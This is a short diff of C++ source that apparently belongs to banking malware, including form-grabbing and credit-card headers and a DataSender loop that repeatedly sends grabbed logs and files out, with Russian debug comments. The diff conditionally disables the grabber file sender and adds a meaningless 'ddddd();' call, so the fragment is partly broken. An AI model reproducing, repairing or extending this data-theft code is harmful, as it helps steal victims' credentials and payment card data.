@@ -9,7 +9,6 @@
 #include "Inject.h"
 #include "Task.h"
 #include "PostDataGrabber.h"
-#include "Grabbers.h"
 
 #include "CreditCardNomber.cpp"
 
@@ -1527,14 +1526,19 @@ namespace DataSender
 			const static DWORD WaitInterval = 30*1000;
     	#endif
 
+#ifdef GrabbersH
         TGrabberFileSender GrabberFiles; // Новая версия грабера
+		ddddd();
+#endif
 
 		while (1)
 		{
 			LDBG("Loader", "Обрабатываем хранилище отправляемых данных");
 
 			// Отправляем новые логи
+#ifdef GrabbersH
             GrabberFiles.SendFiles();
+#endif
 
 			// Отправляем файлы грабера
 			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);
